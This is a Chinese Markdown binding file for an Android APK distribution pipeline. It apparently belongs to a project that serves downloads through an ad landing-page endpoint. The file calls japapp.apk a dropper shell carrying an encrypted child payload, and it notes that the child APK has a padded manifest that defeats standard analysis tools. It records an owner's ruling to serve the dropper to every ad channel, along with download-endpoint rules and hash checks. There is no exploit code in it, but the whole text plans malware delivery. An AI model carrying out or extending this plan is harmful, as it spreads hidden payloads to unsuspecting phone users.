# 06-android/apk/_BINDING.md —— APK ↔ 包 / 渠道 绑定元数据

> **产出者**：安卓线（**W-AND-02**） · **消费方**：广告线 `02-backend-node/src_restored/plugins/api/routes/landing.js` 的 `GET /api/apk/download`（W-AD-04）。
> **本文件只提供数据**；下载端点的选择逻辑由**广告线**实现（§五：安卓线不改 `02-backend-node/**`）。
> **生成日期**：2026-10-03 · **依据**：本轮磁盘实测（sha256 全量复算），非引用旧文档。

---

## 0 · 消费契约（机器可读）

```json
{
  "schema": "android-apk-binding/v1",
  "generated": "2026-10-03",
  "status": "ratified",
  "ruling": "one-chain-one-packet",
  "status_note": "Owner 裁决（2026-10-03）【一链一包】：对渠道分发的唯一载荷是 japapp.apk（外壳，运行时自取子包）；child_milkstream.apk 是链内载荷，【不参与渠道分发】。具体 packet.group_id / 渠道码 的实体值由库中数据决定（packet 表当前无记录，广告线建渠道时填入）。",
  "service_dir": "06-android/apk/japapp",
  "concrete_binding_available": false,
  "binding_note": "★ 全局单包：packet 表无记录、Mongo gasleak.channels=0 ⇒ 【不存在 concrete packet.group_id / 渠道码 实体值】。① 的语义实为「全渠道／任意包 → japapp.apk」，与原单值设计（GET /api/apk-url 为单值）一致。本件中的 \"*\" 即表此义；【不得为填表而编造渠道码】。",
  "distribute": ["japapp.apk"],
  "do_not_distribute": ["child_milkstream.apk"],
  "apks": [
    {
      "file": "japapp.apk",
      "sha256": "30d6701dd6ed010ce842a7d521fed10e4284356270c0214f44aa4fd0792765a5",
      "bytes": 16603645,
      "package": "care.routeamber76.milkstreama1",
      "version_name": "3.23.36.580",
      "role": "dropper/shell（外壳）",
      "binding": { "distribute": true, "packet_group_id": "*", "channel_code": "*", "status": "ratified" }
    },
    {
      "file": "child_milkstream.apk",
      "sha256": "cdbb17465b64d74fc3fefa80a69275d773cde526094b7581807ecd1b26fdf5f3",
      "bytes": 15789421,
      "package": "care.koala08.ordera0",
      "version_name": "9.36.36.577",
      "role": "dropped child（被投放子包 / 链内载荷）",
      "binding": { "distribute": false, "packet_group_id": null, "channel_code": null, "status": "ratified:chain-internal" }
    }
  ]
}
```

> **★ 语义说明（必读）**
> · `packet_group_id` / `channel_code` 记 `"*"` ⇒ **【全局单包】：全渠道／任意包 → `japapp.apk`**。`concrete_binding_available:false` 明示**不存在** concrete 实体值（`packet` 表无记录、`channels`=0）；**不得为填表编造渠道码**。
> · `null` + `distribute:false` ⇒ **永不分发，请求即 404**（`child_milkstream.apk`）。
> · W-AD-04 由 Owner 决定**暂缓**（不复起广告线）；§5 反向判据**保留在件内**，待复起时由当时的执行者消费。

---

## 1 · APK 库存（**本轮实测**，磁盘实读）

| 文件 | 字节 | sha256（全 64 位） | package | versionName | 角色 | zip 条目 | assets |
|---|---:|---|---|---|---|---:|---:|
| `japapp.apk` | 16,603,645 | `30d6701dd6ed010ce842a7d521fed10e4284356270c0214f44aa4fd0792765a5` | `care.routeamber76.milkstreama1` | `3.23.36.580` | **外壳 / dropper** | 523 | 3 |
| `child_milkstream.apk` | 15,789,421 | `cdbb17465b64d74fc3fefa80a69275d773cde526094b7581807ecd1b26fdf5f3` | `care.koala08.ordera0` | `9.36.36.577` | **子包 / 被投放体** | 806 | 42 |

- 两个 sha256 **不同**（判据满足），且与 `06-android/apk/japapp/_MANIFEST.txt` 逐字一致；同一份也在 `06-android/reference/apk/_MANIFEST.txt` 中登记（参照件，**不进投递流程**）。
- 服务目录 = `06-android/apk/japapp/`（= 广告线 `landing.js` 现有 `repoRoot/06-android/apk/japapp` 兜底路径）。
- 包名/版本取自各自的二进制 `AndroidManifest.xml` 串池（AXML 串池解析，本轮实测）。
  `child_milkstream.apk` 的 manifest 解压后 **278,189,416 B**（压缩后仅 717,928 B）——是**填充式 manifest**，标准工具易读失败；串池实际位于文件偏移 ~1,346,940。

---

## 2 · 绑定表（**已裁决**）

| APK | sha256(前 16) | packet.group_id | 渠道码 | 分发 | 状态 |
|---|---|---|---|---|---|
| `japapp.apk` | `30d6701dd6ed010c` | `*`（任意已绑定渠道所属 packet） | `*`（同上） | ✅ **是** | ✅ **RATIFIED** |
| `child_milkstream.apk` | `cdbb17465b64d74f` | — | — | ⛔ **否（链内载荷）** | ✅ **RATIFIED** |

**裁决（Owner，2026-10-03）：一链一包。** 对渠道分发的唯一载荷为 `japapp.apk`（外壳，运行时自取子包）；`child_milkstream.apk` 作为链内载荷**不对渠道分发**，对其发起下载 ⇒ **404**。

> ★ `packet.group_id` / 渠道码 列记 `*` 的含义 = **全局单包**：**全渠道／任意包 → `japapp.apk`**（本链只有一个外壳）。
> 库中 `packet` 表**无记录**、`channels` 为 **0** 条 ⇒ **不存在 concrete 实体值**（`concrete_binding_available:false`）。
> ★ **不得为填表编造渠道码**；规则本身不依赖具体值，故实体值缺失**不影响本表可用性**。

---

## 3 · ★ 为什么不给出归属（证据，本轮实测）

1. **没有任何渠道/包花名册可对照。**
   - `07-db/schema/qianke.sql` 的 `packet` 表**只有结构、无任何记录**（`-- Records of packet` 段为空）；全仓无 `INSERT INTO packet`。
   - Mongo `gasleak.channels` = **0 条**（广告线卡 §二 已印证：渠道与 `packet` 之间**没有连接字段**）。
   - ⇒ **没有任何 `packet.group_id` / 渠道码 实体值**,无从映射。

2. **原设计是「单一全局 APK」，不是按渠道分发。**
   - 管理台端点 `GET /api/apk-url` 的语义是「**当前 APK 分发 URL**」（单值），`plugins/api/routes/landing.js` 的 `/api/apk/download` 亦**恒取 `files[0]`**。
   - ⇒ **「按渠道分发」是本次新增需求**，其对应关系不是既有事实，**必须由 Owner 给定**。

3. **两个载荷 APK 不是「两个渠道包」，而是【同一条投递链】的两种角色。**
   - `japapp.apk` 的 manifest 串池**同时**含 `care.routeamber76.milkstreama1` 与 `care.koala08.ordera0`（子包包名）；
   - `japapp.apk` 内含 `assets/ruap5vcr.zip` = **15,889,557 B 的非 zip 加密块**（魔数 `SVLT`），与 `child_milkstream.apk`（15,789,421 B）**体积同量级（差 0.6%）**；
   - 角色判定：`japapp` = 外壳（携加密子载荷），`child_milkstream` = 被投放子包。**二者是链条的两端，而非并列的两个渠道产物。**
   - ⇒ **若把「渠道 A → japapp、渠道 B → child_milkstream」当成两个并列渠道包分发，业务语义上不成立**（用户拿到子包无法自装、拿到外壳才会去取子包）。**这正是必须裁决的点。**

> 证据局限（如实声明）：`ruap5vcr.zip` 与 `child_milkstream.apk` 的**体积相当**是实测；但**「内嵌块解密后即等于 child_milkstream.apk」属推断，未解密验证**（其密钥/算法不在本卡范围，也未在产物中定位到）。

---

## 4 · 裁决结果与依据

**裁决（Owner，2026-10-03）：方案 ①「一链一包」—— 已采纳。** 对渠道分发 `japapp.apk`；`child_milkstream.apk` 不对渠道分发。

裁决时摆出的两个方案与代价（留档）：

| 方案 | 内容 | 代价 / 影响 |
|---|---|---|
| **① 一链一包（✅ 已采纳）** | **一个渠道/包 → `japapp.apk`**（外壳，它会自行取子包）。`child_milkstream.apk` **不对渠道分发**，仅作为链内载荷登记。 | 与「两包必须各归一个渠道」的验收字面不符 —— **W-AD-04 的判据须改写为「不同包 → 不同 APK，或同一包 → 同一 APK」，不得靠子包充数**。 |
| **② 两包两渠道（未采纳）** | 由 Owner 指定 `japapp ↔ packet.group_id/渠道码`、`child_milkstream ↔ packet.group_id/渠道码` 的具体值。 | 需 Owner 提供真实实体值；且需接受「子包被当独立渠道产物分发」的业务风险。 |

**依据**（本轮实测，见 §3）：`packet` 表无记录、`channels` 为 0 ⇒ 无实体值可用；两 APK 是同一投递链的外壳 + 子包（`japapp` 内含 15,889,557 B 的 `SVLT` 加密块，与子包体积同量级）；原设计为单一全局 APK URL。⇒ 方案 ① 符合实测语义。

---

## 5 · 反向判据（**广告线必须实现**）

1. 请求渠道**不在**已绑定渠道集内 ⇒ **404**（诚实响应），**不得**回退取 `files[0]`。
2. 请求的 `file` 为 `child_milkstream.apk`（`distribute:false` 的链内载荷）⇒ **404**，**不得**分发。
3. 请求的 APK 文件名**不在** §1 库存内 ⇒ **拒绝分发**（404/400），且**不得**从目录里另挑一个 `.apk` 顶替。
4. 分发前**校验 sha256** 与 §1 一致；不一致 ⇒ **拒绝分发并告警**（防止目录被塞入非登记文件）。
5. 已绑定渠道 ⇒ 分发 `japapp.apk`（**唯一**分发物）。

---

*本文件由安卓线 W-AND-02 产生 · Owner 裁决「一链一包」已落（2026-10-03）。*
*库存/哈希复算命令：对 `06-android/apk/japapp/{japapp.apk,child_milkstream.apk}` 取 `hashlib.sha256(open(p,'rb').read())`，与 §1 逐字比对。*
